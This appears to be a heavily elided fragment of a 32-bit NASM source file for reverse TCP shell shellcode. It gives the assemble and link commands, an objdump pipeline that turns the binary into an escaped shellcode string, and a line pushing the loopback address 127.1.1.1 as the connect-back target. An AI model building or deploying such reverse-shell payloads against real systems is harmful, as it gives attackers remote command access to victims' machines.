...
; Assembler:     nasm -f elf32 reverse_tcp_shell.nasm -o reverse_tcp_shell.o
; Linker:        ld -m elf_i386 reverse_tcp_shell.o -o reverse_tcp_shell
; Assembly dump: objdump -d ./reverse_tcp_shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
...
_start:
	...
	push 0x0101017f   ; 127.1.1.1 = 7F01010101
